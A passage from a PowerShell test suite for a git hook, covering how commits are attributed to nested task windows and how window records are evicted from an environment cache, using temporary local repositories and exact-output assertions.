    Set-Content -Path $script:EnvCache -Encoding UTF8 -Value @("TASK_ID='42'")
    $g24eNone = Get-AttributedCommitRange -OwnBase $g24eBase -SelfTaskId '42'
    Assert-Eq "24e: no recorded windows yields '' and NOT the sentinel" "True" `
        "$($g24eNone -eq '')"

    # One nested CLOSED window covering c2..c3, inside this task's base..HEAD.
    # Its span is subtracted; the surrounding commits survive as runs.
    # Heads via the ENV, per the documented read asymmetry (see 24d).
    Set-Content -Path $script:EnvCache -Encoding UTF8 -Value @(
        "TASK_ID='42'",
        "TASK_BASE_REF_77='$($g24eAll[3])'")
    [System.Environment]::SetEnvironmentVariable('TASK_HEAD_REF_77', $g24eAll[1], 'Process')
    $g24eOne = Get-AttributedCommitRange -OwnBase $g24eBase -SelfTaskId '42'
    # ASSERT THE EXACT RANGE LIST. The first version of this case asserted that
    # an interior commit was absent from the output, which holds under EVERY
    # mutation: a covered commit is never a run boundary, and an uncovered one
    # here is interior to the run, so the SHA appears in neither outcome. The
    # window spans two commits with no owned record, so its residual is 2, it
    # reads AMBIGUOUS, nothing is subtracted, and the whole span is one run.
    # Pinning the exact output is what makes the classification observable.
    Assert-Eq "24e: an AMBIGUOUS window subtracts nothing - one run over the whole span" `
        ($g24eAll[3] + '^ ' + $g24eAll[0] + "`n") $g24eOne

    # A task ALL of whose commits were made by nested windows yields the
    # SENTINEL, not '' - it must produce an EMPTY snapshot rather than falling
    # back to the base and absorbing its children's work.
    # The window must classify PURE for its span to be subtracted, so it spans
    # ONE commit (residual 1). A four-commit window with no owned record has
    # residual 4, reads AMBIGUOUS, and correctly contributes nothing - bash
    # behaves identically, and expecting a sentinel there was a fixture error,
    # not a port defect.
    Set-Content -Path $script:EnvCache -Encoding UTF8 -Value @(
        "TASK_ID='42'",
        "TASK_BASE_REF_77='$($g24eAll[1])'")
    [System.Environment]::SetEnvironmentVariable('TASK_HEAD_REF_77', $g24eAll[0], 'Process')
    Assert-Eq "24e: a task whose commits are ALL nested yields the SENTINEL, not ''" `
        $script:StrideNoOwnCommits (Get-AttributedCommitRange -OwnBase $g24eAll[1] -SelfTaskId '42')

    # (D256) TWO CONCURRENTLY OPEN SIBLINGS both read AMBIGUOUS and neither is
    # subtracted. This is the single most valuable case in the mirror: D244
    # computed each residual against every other window's full span, which let
    # two windows mutually "cover" the commits they merely shared - both
    # misclassified PURE and the union subtracted the outer's own commit,
    # losing work from its author's snapshot. Mutual coverage is evidence of
    # AMBIGUITY, not purity: a commit has one owner.
    Set-Content -Path $script:EnvCache -Encoding UTF8 -Value @(
        "TASK_ID='42'",
        "TASK_BASE_REF_77='$($g24eAll[4])'",
        "TASK_BASE_REF_88='$($g24eAll[4])'")
    [System.Environment]::SetEnvironmentVariable('TASK_HEAD_REF_77', $g24eAll[1], 'Process')
    [System.Environment]::SetEnvironmentVariable('TASK_HEAD_REF_88', $g24eAll[1], 'Process')
    $g24eSib = Get-AttributedCommitRange -OwnBase $g24eBase -SelfTaskId '42'
    Assert-Eq "24e (D256): two overlapping sibling windows do NOT both subtract" "True" `
        "$($g24eSib -ne $script:StrideNoOwnCommits)"
    # Assert the OVER-REPORT positively, not just the absence of a sentinel.
    # Both siblings are ambiguous, so nothing is covered and the outer's run
    # starts at its FIRST commit. A weaker "not the sentinel" check passes even
    # when the siblings wrongly subtract, because one later commit still
    # survives to form a run - which is how the residual-default mutant
    # (defaulting to 0 instead of the full set size, i.e. failing toward
    # subtracting a span) slipped through the first version of this case.
    Assert-Eq "24e (D256): and the outer keeps its own earliest commit - over-report" "True" `
        "$($g24eSib -match [regex]::Escape($g24eAll[3]))"

    # (D255) A window whose task recorded a NON-EMPTY owned set names its
    # commits exactly and supersedes the purity heuristic for that window.
    [System.Environment]::SetEnvironmentVariable('TASK_HEAD_REF_88', $null, 'Process')
    Set-Content -Path $script:EnvCache -Encoding UTF8 -Value @(
        "TASK_ID='42'",
        "TASK_BASE_REF_77='$($g24eAll[3])'",
        "TASK_OWNED_77='$($g24eAll[2])'")
    [System.Environment]::SetEnvironmentVariable('TASK_HEAD_REF_77', $g24eAll[1], 'Process')
    $g24eOwned = Get-AttributedCommitRange -OwnBase $g24eBase -SelfTaskId '42'
    # The owned record names c2 exactly, so c2 is subtracted and the walk splits
    # into TWO runs around it. Asserting the exact split is what pins D255
    # supersession: the earlier "c2 is absent from the output" form passed with
    # and without the owned record, because c2 is a run INTERIOR either way.
    Assert-Eq "24e (D255): an owned record's SHAs are subtracted, splitting the run" `
        ($g24eAll[3] + '^ ' + $g24eAll[3] + "`n" + $g24eAll[1] + '^ ' + $g24eAll[0] + "`n") $g24eOwned
    [System.Environment]::SetEnvironmentVariable('TASK_HEAD_REF_77', $null, 'Process')
    # (D256) THE SUBSET DIRECTION, isolated. The sibling case above does not
    # discriminate it - both operand orders make both siblings ambiguous - so
    # this builds the geometry where the direction changes the answer:
    #   window A spans {c4}          -> residual 1 -> PURE, joins the pool
    #   window B spans {c3, c4}      -> pool A IS a subset of B, so cov={c4},
    #                                   residual 1 -> PURE, and c3 is subtracted
    # With the operands reversed, B-subset-of-A is false, cov is empty, B reads
    # AMBIGUOUS, and c3 survives into the outer's ranges. Asserting c3's absence
    # is therefore a direct test of the direction, and it caught the reversed
    # mutant that the sibling case let through.
    [System.Environment]::SetEnvironmentVariable('TASK_HEAD_REF_88', $g24eAll[0], 'Process')
    [System.Environment]::SetEnvironmentVariable('TASK_HEAD_REF_77', $g24eAll[0], 'Process')
    Set-Content -Path $script:EnvCache -Encoding UTF8 -Value @(
        "TASK_ID='42'",
        "TASK_BASE_REF_77='$($g24eAll[1])'",
        "TASK_BASE_REF_88='$($g24eAll[2])'")
    $g24eNest = Get-AttributedCommitRange -OwnBase $g24eBase -SelfTaskId '42'
    Assert-Eq "24e (D256): a pure window NESTED in a larger one makes the larger pure too" "False" `
        "$($g24eNest -match [regex]::Escape($g24eAll[1]))"
    Assert-Eq "24e (D256): and the outer's own earlier commits still survive" "True" `
        "$($g24eNest -match [regex]::Escape($g24eAll[3]))"
    [System.Environment]::SetEnvironmentVariable('TASK_HEAD_REF_77', $null, 'Process')
    [System.Environment]::SetEnvironmentVariable('TASK_HEAD_REF_88', $null, 'Process')
} else {
    Write-Host "  SKIP: 24e: the classifier cases need git" -ForegroundColor Yellow
}

$ProjectDir = $g24SavedProjectDir

}

# ============================================================
# Test Group 25: W2103 — per-window eviction (D268/D273/D274)
# ============================================================
# Mirrors the assertions ace9b06 added for D274, by DEFECT ID rather than case
# number. The defect being pinned: D268's per-family tail cap evicted the OLDEST
# record, which is structurally the longest-lived OUTER task's anchor, and D274
# found that capping OPEN windows by count reached the same defect from the
# other side - the cap keeps the newest opens and drops the oldest, and the
# oldest open window is structurally the live enclosing outer. Measured on the
# hook itself: 19 open children left the outer intact, 20 lost both its anchor
# and its deliverable.
Write-Host ""
Write-Host "=== Test Group 25: W2103 per-window eviction ==="

$g25Want = @(
    'Get-DeadOpenWindowId', 'Select-KeptWindowRecord', 'Get-CarriedWindowRecordLine',
    'Resolve-CaptureNarrowing', 'Invoke-ReplayNarrowingDecision',
    'Get-TaskNarrowedRecord', 'Test-AnotherOpenWindowExists', 'Get-OpenWindowMaxAgeSecs',
    'Get-TaskHeadRefFor', 'Get-TaskBaseAtRecord', 'Write-DiffUploadState',
    'Get-EnvCacheLine', 'Split-EnvCacheRecord', 'Read-TaskRecord',
    'ConvertFrom-ShSingleQuoted', 'ConvertTo-ShSingleQuoted',
    'Get-TaskRecordKey', 'Get-TaskBaseRefKey', 'Get-TaskHeadRefKey',
    'Get-TaskOwnedKey', 'Get-TaskBaseAtKey', 'Get-TaskNarrowedKey'
)
$g25Ast = [System.Management.Automation.Language.Parser]::ParseFile($HookScript, [ref]$null, [ref]$null)
$g25Found = @()
foreach ($f in $g25Ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $true)) {
    if ($g25Want -contains $f.Name) { $g25Found += $f.Name; . ([scriptblock]::Create($f.Extent.Text)) }
}
foreach ($a in $g25Ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.AssignmentStatementAst] }, $true)) {
    if ($a.Left.Extent.Text -eq '$script:StrideOpenWindowSweepAt') { . ([scriptblock]::Create($a.Extent.Text)) }
}
$g25Missing = @($g25Want | Where-Object { $g25Found -notcontains $_ })
if ($g25Missing.Count -gt 0) {
    Write-Host "  FAIL: 25-harness: could not extract from stride-hook.ps1: $($g25Missing -join ', ')" -ForegroundColor Red
    $script:FAIL++
} else {
    Write-Host "  PASS: 25-harness: all $($g25Want.Count) eviction functions extracted from the real hook" -ForegroundColor Green
    $script:PASS++

$g25SavedProjectDir = $ProjectDir
$g25Git = Get-Command git -ErrorAction SilentlyContinue

# Build a repo and seed a cache with N open windows (base, no head partner).
function New-G25Fixture {
    param([string]$Name, [int]$OpenCount, [switch]$GarbageBases)
    $d = Join-Path $TmpDir "g25-$Name"
    Remove-Item -Recurse -Force $d -ErrorAction SilentlyContinue
    New-Item -ItemType Directory -Path $d -Force | Out-Null
    & git -C $d init -q 2>$null | Out-Null
    & git -C $d config user.email 'test@test.local' 2>$null | Out-Null
    & git -C $d config user.name 'Test' 2>$null | Out-Null
    & git -C $d config commit.gpgsign false 2>$null | Out-Null
    Set-Content -Path (Join-Path $d 'seed.txt') -Value 'seed' -Encoding UTF8
    & git -C $d add -A 2>$null | Out-Null
    & git -C $d commit -q -m 'seed' 2>$null | Out-Null
    $head = (& git -C $d rev-parse HEAD 2>$null | Out-String).Trim()
    $lines = New-Object System.Collections.Generic.List[string]
    for ($i = 1; $i -le $OpenCount; $i++) {
        # SHA-shaped but resolving to nothing is the ONLY signal the sweep acts
        # on, so that is the only variation this fixture needs. (An earlier
        # version carried a -RealButUnreachable switch whose branch was
        # byte-identical to the default and which no caller passed - a fixture
        # shape that looked like it distinguished something and distinguished
        # nothing, which is the same defect this group's review kept finding in
        # the assertions.)
        $v = if ($GarbageBases) { ('{0:d40}' -f 0).Substring(0, 40 - "$i".Length) + "$i" } else { $head }
        $lines.Add("TASK_BASE_REF_$((100 + $i))='$v'") | Out-Null
    }
    Set-Content -Path (Join-Path $d '.stride-env-cache') -Value $lines -Encoding UTF8
    return @{ Dir = $d; Head = $head }
}

# --- 25a (D274, sh 23e): 25 open windows whose bases do NOT resolve -> all swept ---
if ($g25Git) {
    $g25a = New-G25Fixture -Name 'garbage' -OpenCount 25 -GarbageBases
    $ProjectDir = $g25a.Dir
    $script:EnvCache = Join-Path $g25a.Dir '.stride-env-cache'
    Assert-Eq "25a (D274): 25 open windows with unresolvable bases are all swept" "0" `
        "$(@(Select-KeptWindowRecord).Count)"
} else {
    Write-Host "  SKIP: 25a: needs git" -ForegroundColor Yellow
}

# --- 25b (D274, sh 23e1): 25 open windows with LIVE bases -> ALL kept ---
# This is the assertion the old count cap failed: it kept 20 and dropped 5, and
# the 5 it dropped were the OLDEST, which is where the live enclosing outer is.
if ($g25Git) {
    $g25b = New-G25Fixture -Name 'live' -OpenCount 25
    $ProjectDir = $g25b.Dir
    $script:EnvCache = Join-Path $g25b.Dir '.stride-env-cache'
    Assert-Eq "25b (D274): 25 open windows with live bases are ALL kept - no count cap" "25" `
        "$(@(Select-KeptWindowRecord).Count)"
    # And the OLDEST specifically - the one a count cap drops first, and the one
    # that is structurally the live enclosing outer.
    Assert-Eq "25b (D274): the OLDEST open window survives, which a count cap evicts first" "True" `
        "$((@(Select-KeptWindowRecord)[0]) -like 'TASK_BASE_REF_101=*')"
} else {
    Write-Host "  SKIP: 25b: needs git" -ForegroundColor Yellow
}

# --- 25c (D274, sh 23e1b): detached HEAD, bases NOT ancestors -> still all kept ---
# The sweep must act on NON-RESOLUTION ONLY. Ancestry is a property of where
# HEAD points right now, so a bisect or a detached checkout makes a live outer's
# base a non-ancestor - and DELETING its record is not recoverable when HEAD
# comes back. If the sweep ever borrowed Test-AnotherOpenWindowExists's ancestry
# check, this is the assertion that would catch it.
if ($g25Git) {
    # The bases must be REAL commits that are genuinely NOT ancestors of HEAD -
    # a divergent branch, not a descendant. The first version of this fixture
    # detached onto a DESCENDANT, so the seeded bases were still ancestors and
    # an ancestry check in the sweep passed the test unnoticed. Caught by
    # mutation; the geometry is the assertion.
    $g25c = New-G25Fixture -Name 'detached' -OpenCount 0
    $ProjectDir = $g25c.Dir
    $script:EnvCache = Join-Path $g25c.Dir '.stride-env-cache'
    $null = & git -C $g25c.Dir checkout -q -b sidebranch 2>$null
    Set-Content -Path (Join-Path $g25c.Dir 'side.txt') -Value 'side' -Encoding UTF8
    $null = & git -C $g25c.Dir add -A 2>$null
    $null = & git -C $g25c.Dir commit -q -m 'side' 2>$null
    $g25cSide = (& git -C $g25c.Dir rev-parse HEAD 2>$null | Out-String).Trim()
    $null = & git -C $g25c.Dir checkout -q - 2>$null
    # Sanity: the side commit must NOT be an ancestor of HEAD, or this proves
    # nothing. A control, because a fixture that quietly stopped diverging would
    # make the assertion below vacuous again.
    $null = & git -C $g25c.Dir merge-base --is-ancestor $g25cSide HEAD 2>$null
    Assert-Eq "25c: CONTROL - the seeded base is genuinely NOT an ancestor of HEAD" "False" `
        "$($LASTEXITCODE -eq 0)"
    $g25cLines = New-Object System.Collections.Generic.List[string]
    for ($i = 1; $i -le 25; $i++) { $g25cLines.Add("TASK_BASE_REF_$((100 + $i))='$g25cSide'") | Out-Null }
    Set-Content -Path $script:EnvCache -Value $g25cLines -Encoding UTF8
    Assert-Eq "25c (D274): a resolvable NON-ANCESTOR base is kept - the sweep acts on resolution ONLY" "25" `
        "$(@(Select-KeptWindowRecord).Count)"
} else {
    Write-Host "  SKIP: 25c: needs git" -ForegroundColor Yellow
}

# --- 25d (D274, sh 23e4): the outer's anchor survives 19 AND 20 open children ---
# The measured defect: 19 open children left the outer intact, 20 lost both its
# anchor and its deliverable. Both counts are asserted, because the boundary is
# exactly where the defect lived.
if ($g25Git) {
    foreach ($n in @(19, 20, 22)) {
        $g25d = New-G25Fixture -Name "outer$n" -OpenCount 0
        $ProjectDir = $g25d.Dir
        $script:EnvCache = Join-Path $g25d.Dir '.stride-env-cache'
        $lines = New-Object System.Collections.Generic.List[string]
        # The OUTER's own open anchor, written FIRST so it is the oldest.
        $lines.Add("TASK_BASE_REF_100='$($g25d.Head)'") | Out-Null
        for ($i = 1; $i -le $n; $i++) {
            $lines.Add("TASK_BASE_REF_$((200 + $i))='$($g25d.Head)'") | Out-Null
        }
        Set-Content -Path $script:EnvCache -Value $lines -Encoding UTF8
        $kept = @(Select-KeptWindowRecord)
        Assert-Eq "25d (D274): with $n open children the OUTER's anchor survives" "True" `
            "$([bool](@($kept | Where-Object { $_ -like 'TASK_BASE_REF_100=*' }).Count -eq 1))"
        Assert-Eq "25d (D274): and with $n open children every window survives" "$($n + 1)" "$($kept.Count)"
    }
} else {
    Write-Host "  SKIP: 25d: needs git" -ForegroundColor Yellow
}

# --- 25e (D274, sh 23e4): TWO enclosing levels both survive ---
if ($g25Git) {
    $g25e = New-G25Fixture -Name 'twolevel' -OpenCount 0
    $ProjectDir = $g25e.Dir
    $script:EnvCache = Join-Path $g25e.Dir '.stride-env-cache'
    $lines = New-Object System.Collections.Generic.List[string]
    $lines.Add("TASK_BASE_REF_100='$($g25e.Head)'") | Out-Null
    $lines.Add("TASK_BASE_REF_110='$($g25e.Head)'") | Out-Null
    for ($i = 1; $i -le 22; $i++) { $lines.Add("TASK_BASE_REF_$((300 + $i))='$($g25e.Head)'") | Out-Null }
    Set-Content -Path $script:EnvCache -Value $lines -Encoding UTF8
    $g25eKept = @(Select-KeptWindowRecord)
    Assert-Eq "25e (D274): with two enclosing levels open, BOTH anchors survive" "True" `
        "$([bool](@($g25eKept | Where-Object { $_ -like 'TASK_BASE_REF_100=*' -or $_ -like 'TASK_BASE_REF_110=*' }).Count -eq 2))"
} else {
    Write-Host "  SKIP: 25e: needs git" -ForegroundColor Yellow
}

# --- 25f (D274, sh 23e4): a provably-dead window is swept while live ones stay ---
if ($g25Git) {
    $g25f = New-G25Fixture -Name 'mixed' -OpenCount 0
    $ProjectDir = $g25f.Dir
    $script:EnvCache = Join-Path $g25f.Dir '.stride-env-cache'
    $lines = New-Object System.Collections.Generic.List[string]
    $lines.Add("TASK_BASE_REF_777='0000000000000000000000000000000000000000'") | Out-Null
    for ($i = 1; $i -le 22; $i++) { $lines.Add("TASK_BASE_REF_$((400 + $i))='$($g25f.Head)'") | Out-Null }
    Set-Content -Path $script:EnvCache -Value $lines -Encoding UTF8
    $g25fKept = @(Select-KeptWindowRecord)
    Assert-Eq "25f (D274): the all-zero dead window is swept" "0" `
        "$(@($g25fKept | Where-Object { $_ -like 'TASK_BASE_REF_777=*' }).Count)"
    Assert-Eq "25f (D274): while every live anchor is kept" "22" "$($g25fKept.Count)"
    # A base that is NOT SHA-shaped is unusable but not PROVABLY dead, so it is
    # KEPT. Deleting it would be acting on a signal that is not evidence.
    $lines.Add("TASK_BASE_REF_888='not-a-sha'") | Out-Null
    Set-Content -Path $script:EnvCache -Value $lines -Encoding UTF8
    Assert-Eq "25f (D274): a non-SHA base is unusable but NOT swept - keeping is the safe direction" "1" `
        "$(@(Select-KeptWindowRecord | Where-Object { $_ -like 'TASK_BASE_REF_888=*' }).Count)"
} else {
    Write-Host "  SKIP: 25f: needs git" -ForegroundColor Yellow
}

# --- 25g: below the threshold the sweep runs NO git and proves nothing dead ---
# The ordinary cache - a handful of open windows - must pay nothing and, more
# importantly, must never lose a record to a sweep that had no evidence.
if ($g25Git) {
    $g25g = New-G25Fixture -Name 'under' -OpenCount 5 -GarbageBases
    $ProjectDir = $g25g.Dir
    $script:EnvCache = Join-Path $g25g.Dir '.stride-env-cache'
    Assert-Eq "25g: at or under the threshold nothing is swept, even unresolvable bases" "5" `
        "$(@(Select-KeptWindowRecord).Count)"
    Assert-Eq "25g: and Get-DeadOpenWindowId proves nothing dead below the threshold" "0" `
        "$(@(Get-DeadOpenWindowId -SweepAt 20 -ReserveKey '').Count)"
} else {
    Write-Host "  SKIP: 25g: needs git" -ForegroundColor Yellow
}

# --- 25h: the reserved key is dual-purpose - excluded AND threshold minus one ---
if ($g25Git) {
    $g25h = New-G25Fixture -Name 'reserve' -OpenCount 20
    $ProjectDir = $g25h.Dir
    $script:EnvCache = Join-Path $g25h.Dir '.stride-env-cache'
    $g25hAll = @(Select-KeptWindowRecord)
    $g25hRes = @(Select-KeptWindowRecord -ReserveKey 'TASK_BASE_REF_101')
    Assert-Eq "25h: without a reserve, all 20 windows are returned" "20" "$($g25hAll.Count)"
    Assert-Eq "25h: the reserved key's own line is excluded" "0" `
        "$(@($g25hRes | Where-Object { $_ -like 'TASK_BASE_REF_101=*' }).Count)"
    Assert-Eq "25h: and the other 19 are still returned" "19" "$($g25hRes.Count)"
} else {
    Write-Host "  SKIP: 25h: needs git" -ForegroundColor Yellow
}

# --- 25i: CLOSED windows older than the anchor cap at 20, newer ones all kept ---
if ($g25Git) {
    $g25i = New-G25Fixture -Name 'closed' -OpenCount 0
    $ProjectDir = $g25i.Dir
    $script:EnvCache = Join-Path $g25i.Dir '.stride-env-cache'
    $lines = New-Object System.Collections.Generic.List[string]
    # 25 CLOSED windows (base + head) older than the anchor...
    for ($i = 1; $i -le 25; $i++) {
        $lines.Add("TASK_BASE_REF_$((500 + $i))='$($g25i.Head)'") | Out-Null
    }
    # ...the anchor, an OPEN window...
    $lines.Add("TASK_BASE_REF_900='$($g25i.Head)'") | Out-Null
    # ...and 3 CLOSED windows newer than it.
    for ($i = 1; $i -le 3; $i++) {
        $lines.Add("TASK_BASE_REF_$((600 + $i))='$($g25i.Head)'") | Out-Null
    }
    for ($i = 1; $i -le 25; $i++) { $lines.Add("TASK_HEAD_REF_$((500 + $i))='$($g25i.Head)'") | Out-Null }
    for ($i = 1; $i -le 3; $i++) { $lines.Add("TASK_HEAD_REF_$((600 + $i))='$($g25i.Head)'") | Out-Null }
    Set-Content -Path $script:EnvCache -Value $lines -Encoding UTF8
    $g25iKept = @(Select-KeptWindowRecord)
    Assert-Eq "25i: the open anchor survives" "1" `
        "$(@($g25iKept | Where-Object { $_ -like 'TASK_BASE_REF_900=*' }).Count)"
    Assert-Eq "25i: CLOSED windows NEWER than the anchor are ALL kept - evicting one would make the outer absorb it" "3" `
        "$(@($g25iKept | Where-Object { $_ -match '^TASK_BASE_REF_60[0-9]=' }).Count)"
    Assert-Eq "25i: CLOSED windows OLDER than the anchor cap at 20 of 25" "20" `
        "$(@($g25iKept | Where-Object { $_ -match '^TASK_BASE_REF_5[0-9][0-9]=' }).Count)"
    # Oldest evicted first: 501-505 go, 506-525 stay. Pin the BOUNDARY, not
    # just that 501 went - counting 20 survivors and checking 501 is absent
    # holds even if the downward walk starts one index off, because only the
    # IDENTITY of the evicted set changes. 505-out/506-in is what the walk
    # start actually decides.
    Assert-Eq "25i: and the OLDEST closed windows are the ones evicted" "0" `
        "$(@($g25iKept | Where-Object { $_ -like 'TASK_BASE_REF_501=*' }).Count)"
    Assert-Eq "25i: the eviction boundary is exact - 505 is evicted" "0" `
        "$(@($g25iKept | Where-Object { $_ -like 'TASK_BASE_REF_505=*' }).Count)"
    Assert-Eq "25i: and 506, one newer, survives" "1" `
        "$(@($g25iKept | Where-Object { $_ -like 'TASK_BASE_REF_506=*' }).Count)"
    Assert-Eq "25i: and the NEWEST closed window older than the anchor survives" "1" `
        "$(@($g25iKept | Where-Object { $_ -like 'TASK_BASE_REF_525=*' }).Count)"
} else {
    Write-Host "  SKIP: 25i: needs git" -ForegroundColor Yellow
}

# --- 25h2: the reserve DECREMENT and the strict threshold actually decide ---
# 25h proves the reserved line is excluded, but all its windows have live bases
# so the THRESHOLD never decides anything - deleting the decrement left the
# suite green. These two fixtures make each arithmetic choice observable.
if ($g25Git) {
    # Reserve decrement: 21 open windows with unresolvable bases, one reserved.
    # 20 remain, threshold drops 20 -> 19, so 20 > 19 sweeps them all. WITHOUT
    # the decrement the threshold stays 20, 20 > 20 is false, and all 20 survive.
    $g25h2 = New-G25Fixture -Name 'reservethreshold' -OpenCount 21 -GarbageBases
    $ProjectDir = $g25h2.Dir
    $script:EnvCache = Join-Path $g25h2.Dir '.stride-env-cache'
    Assert-Eq "25h2: the reserve decrement lowers the threshold, so the sweep fires" "0" `
        "$(@(Select-KeptWindowRecord -ReserveKey 'TASK_BASE_REF_101').Count)"

    # Strict threshold: EXACTLY 20 open windows with unresolvable bases must NOT
    # sweep, because the comparison is "more than", not "at least". Flipping
    # -le to -lt sweeps all 20 here.
    $g25h3 = New-G25Fixture -Name 'exactthreshold' -OpenCount 20 -GarbageBases
    $ProjectDir = $g25h3.Dir
    $script:EnvCache = Join-Path $g25h3.Dir '.stride-env-cache'
    Assert-Eq "25h3: EXACTLY at the threshold nothing is swept - the comparison is strict" "20" `
        "$(@(Select-KeptWindowRecord).Count)"
    # One more and it fires, so the boundary is pinned from both sides.
    $g25h4 = New-G25Fixture -Name 'overthreshold' -OpenCount 21 -GarbageBases
    $ProjectDir = $g25h4.Dir
    $script:EnvCache = Join-Path $g25h4.Dir '.stride-env-cache'
    Assert-Eq "25h4: one over the threshold and the sweep fires" "0" `
        "$(@(Select-KeptWindowRecord).Count)"
} else {
    Write-Host "  SKIP: 25h2: needs git" -ForegroundColor Yellow
}

# --- 25h5: the three control keys are excluded, UNPROVEN included ---
# The claim-side cap used to omit TASK_BASE_REF_UNPROVEN where bash and the
# other site both exclude it. W2103 fixes that by construction in the selector -
# and "by construction" is worth nothing unasserted.
if ($g25Git) {
    $g25h5 = New-G25Fixture -Name 'controlkeys' -OpenCount 0
    $ProjectDir = $g25h5.Dir
    $script:EnvCache = Join-Path $g25h5.Dir '.stride-env-cache'
    Set-Content -Path $script:EnvCache -Encoding UTF8 -Value @(
        "TASK_BASE_REF_101='$($g25h5.Head)'",
        "TASK_BASE_REF_TRUSTED='1'",
        "TASK_BASE_REF_OWNER='101'",
        "TASK_BASE_REF_UNPROVEN='1'")
    $g25h5Kept = @(Select-KeptWindowRecord)
    Assert-Eq "25h5: the real window record is kept" "1" `
        "$(@($g25h5Kept | Where-Object { $_ -like 'TASK_BASE_REF_101=*' }).Count)"
    foreach ($ctl in @('TRUSTED', 'OWNER', 'UNPROVEN')) {
        Assert-Eq "25h5: the TASK_BASE_REF_$ctl control key is never treated as a window" "0" `
            "$(@($g25h5Kept | Where-Object { $_ -like "TASK_BASE_REF_$ctl=*" }).Count)"
    }
} else {
    Write-Host "  SKIP: 25h5: needs git" -ForegroundColor Yellow
}

# --- 25i2: the NO-OPEN-WINDOW branch of the downward walk ---
# Every other Group 25 fixture seeds at least one open window, so the branch
# taken when there is NO anchor - the limit becomes the whole list - was
# asserted nowhere, and mutating it silently dropped the NEWEST closed window.
# That is the ordinary steady state for a single sequential agent, not a corner:
# a cache of nothing but completed windows. The code's own comment names this as
# the off-by-one hazard, which is precisely why it needed a fixture.
if ($g25Git) {
    $g25i2 = New-G25Fixture -Name 'allclosed' -OpenCount 0
    $ProjectDir = $g25i2.Dir
    $script:EnvCache = Join-Path $g25i2.Dir '.stride-env-cache'
    $g25i2Lines = New-Object System.Collections.Generic.List[string]
    for ($i = 1; $i -le 25; $i++) { $g25i2Lines.Add("TASK_BASE_REF_$((700 + $i))='$($g25i2.Head)'") | Out-Null }
    for ($i = 1; $i -le 25; $i++) { $g25i2Lines.Add("TASK_HEAD_REF_$((700 + $i))='$($g25i2.Head)'") | Out-Null }
    Set-Content -Path $script:EnvCache -Value $g25i2Lines -Encoding UTF8
    $g25i2Kept = @(Select-KeptWindowRecord)
    Assert-Eq "25i2: with NO open window, the newest 20 closed windows are kept" "20" "$($g25i2Kept.Count)"
    # The NEWEST must survive - that is the one a mis-set limit drops.
    Assert-Eq "25i2: and the NEWEST closed window survives" "1" `
        "$(@($g25i2Kept | Where-Object { $_ -like 'TASK_BASE_REF_725=*' }).Count)"
    Assert-Eq "25i2: while the oldest five are evicted" "0" `
        "$(@($g25i2Kept | Where-Object { $_ -like 'TASK_BASE_REF_705=*' }).Count)"
    Assert-Eq "25i2: with the boundary exact - 706 survives" "1" `
        "$(@($g25i2Kept | Where-Object { $_ -like 'TASK_BASE_REF_706=*' }).Count)"
} else {
    Write-Host "  SKIP: 25i2: needs git" -ForegroundColor Yellow
}

# --- 25j (D273): the narrowing verdict is REPLAYED, not recomputed ---
# A verdict reached at capture time is a FACT ABOUT THAT CAPTURE. Re-deriving it
# at retry time asks a different question, because the retry's view of which
# windows are open is not the capture's view - so a live re-derivation can
# narrow a window whose verdict was never computed.
if ($g25Git) {
    $g25j = New-G25Fixture -Name 'replay' -OpenCount 0
    $ProjectDir = $g25j.Dir
    $script:EnvCache = Join-Path $g25j.Dir '.stride-env-cache'
    Set-Content -Path $script:EnvCache -Encoding UTF8 -Value @("TASK_ID='42'")
    # 'yes' replays as narrow WITHOUT consulting any live state.
    Assert-Eq "25j (D273): a recorded 'yes' replays as narrow" "True" `
        "$(Invoke-ReplayNarrowingDecision -Narrowed 'yes' -TaskId '42')"
    # 'no' replays as wide - and must NOT fall through to a live check, which
    # is the whole point of persisting it.
    Assert-Eq "25j (D273): a recorded 'no' replays as WIDE, never re-derived" "False" `
        "$(Invoke-ReplayNarrowingDecision -Narrowed 'no' -TaskId '42')"
    # Only an ABSENT verdict falls through to a live check - and the fixture
    # must make that check answer TRUE, or the assertion passes whether the
    # fall-through runs or is replaced by a bare `return $false`. Seed a real
    # open window with a fresh stamp so a live check genuinely says "narrow".
    $g25jNow = [string][int64][math]::Floor(([DateTime]::UtcNow - (New-Object DateTime 1970,1,1,0,0,0,([DateTimeKind]::Utc))).TotalSeconds)
    $g25jHead = (& git -C $g25j.Dir rev-parse HEAD 2>$null | Out-String).Trim()
    Set-Content -Path $script:EnvCache -Encoding UTF8 -Value @(
        "TASK_ID='42'",
        "TASK_BASE_REF_77='$g25jHead'",
        "TASK_BASE_AT_77='$g25jNow'")
    Assert-Eq "25j (D273): an ABSENT verdict falls through to a live check that really runs" "True" `
        "$(Invoke-ReplayNarrowingDecision -Narrowed '' -TaskId '42')"
    # ...and a RECORDED verdict does not consult that live state at all, which
    # is the whole point of persisting it: same cache, opposite answer.
    Assert-Eq "25j (D273): a recorded 'no' ignores the live open window entirely" "False" `
        "$(Invoke-ReplayNarrowingDecision -Narrowed 'no' -TaskId '42')"
    # EXACT, as bash's `case yes)` is exact. PowerShell's -eq is
    # case-INsensitive, so 'YES' narrowed where bash would have fallen through
    # to the wide path - and bash states at sh:1846 that a tampered or
    # truncated value must go wide, because wide over-reports while narrow can
    # LOSE this task's own work. 'YES' takes neither the equal branch nor the
    # empty one, so it lands on the explicit `return $false`; with -eq it takes
    # the equal branch and returns $true instead. That is the whole
    # discriminator - reverting -ceq to -eq turns exactly this row red.
    Assert-Eq "25j (D273): a MIXED-CASE verdict does not narrow - bash's case is exact" "False" `
        "$(Invoke-ReplayNarrowingDecision -Narrowed 'YES' -TaskId '42')"

    # The resolver prefers the PER-TASK RECORD over the state file, because the
    # state file holds one task and is truncated on every write - an interleaved
    # completion erases it exactly when it is needed.
    Set-Content -Path $script:EnvCache -Encoding UTF8 -Value @(
        "TASK_ID='42'",
        "TASK_NARROWED_42='yes'")
    Assert-Eq "25j (D273): the per-task record wins over the state file" "yes" `
        (Resolve-CaptureNarrowing -TaskId '42' -StateValue 'no')
    # With no record, the state file is the documented second source.
    Set-Content -Path $script:EnvCache -Encoding UTF8 -Value @("TASK_ID='42'")
    Assert-Eq "25j (D273): with no record, the state file is the second source" "no" `
        (Resolve-CaptureNarrowing -TaskId '42' -StateValue 'no')
    # Neither: empty means "re-derive", which the replay turns into a live check.
    Assert-Eq "25j (D273): neither source means empty, i.e. re-derive" "" `
